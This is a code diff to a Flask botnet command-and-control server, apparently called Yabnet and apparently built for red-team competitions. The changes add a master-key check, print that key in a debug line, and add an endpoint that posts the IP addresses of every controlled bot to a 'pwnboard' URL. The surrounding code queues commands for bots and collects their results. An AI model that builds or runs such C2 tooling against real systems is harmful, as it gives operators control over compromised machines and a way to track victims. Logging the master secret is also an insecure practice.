@@ -3,6 +3,7 @@ import re
 import json
 import random
 import string
+import requests
 from IPy import IP
 
 from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory, Response 
@@ -78,6 +79,9 @@ def posterrorcheck(requestobj, *args):
         try:
             if data[arg] is None:
                 return jsonify({'error': 'parameter'+str(arg)+'is missing'})
+            elif arg == 'masterkey':
+                if data[arg] != MASTERKEY:
+                    return jsonify({'error': "[-] YOU ARE NOT MY MASTER"})
         except Exception as e:
             return jsonify({'error': str(e)})
 
@@ -102,6 +106,7 @@ def authentication():
 
     print("[DEBUG] username = ", username)
     print("[DEBUG] password = ", password)
+    print("[DEBUG] masterkey = ", MASTERKEY)
 
     # API Endpoint logic 
     try:
@@ -259,7 +264,7 @@ def botpush(target):
             query_bot = Bot.query.filter_by(id=bot_id).first()
 
         cmd = Command(cmd, query_bot.id, query_bot.ip)
-        print(cmd)
+        #print(cmd)
 
         # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
         try:
@@ -370,7 +375,7 @@ def botresult(bot_id):
             try:
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
-                print("[DEBUG] command info = ", command.get_info())
+                #print("[DEBUG] command info = ", command.get_info())
                 
                 result = command.result
 
@@ -547,6 +552,9 @@ def download_file(filename):
 
 @app.route('/cleanup', methods=['POST'])
 def cleanup():
+    """
+    Description: Clean up all of the staged commands. Start fresh! 
+    """
     
     # Error checking 
     error = posterrorcheck(request, 'masterkey')
@@ -564,6 +572,45 @@ def cleanup():
         db.session.commit()
     
     return jsonify({'success': 'All commands staged has been removed and cleaned up'})
+
+
+@app.route('/updatepwnboard', methods=['POST'])
+def updatepwnboard():
+    """
+    Description: Receives pwnboard endpoint from the master, and sends off pwnboard update to the corresponding address.
+    Pwnboard accepts post param of "ips" (list) and "type" (str). 
+
+    Params:
+        - (str) pwnboardURL = pwnboard Endpoint URL 
+    """
+    error = posterrorcheck(request, 'masterkey', 'pwnboardURL')
+    if error is not True:
+        return error 
+
+    data = request.form
+    masterkey = data['masterkey']
+    pwnboardURL = data['pwnboardURL']
+    
+    try:
+        botlist = Bot.query.all()
+    except Exception as e:
+        return jsonify({'error': "[-] " + str(e)})
+
+    ips = []
+    for bot in botlist:
+        print("[DEBUG] ips = ", bot.ip, end=', ')
+        ips.append(bot.ip)
+    
+    postData = {'ips': ips, 'type': 'Yabnet'}
+    try:
+        res = requests.post(pwnboardURL, json=postData)
+        print("[+] Successfully sent update to pwnboard: " + pwnboardURL)
+        print(res.text)
+    except Exception as e:
+        return jsonify({'error': "[-] Updating pwnboard failed: " + str(e)})
+
+    return '' 
+
 
 # ========================= Flask App Starts =========================
 
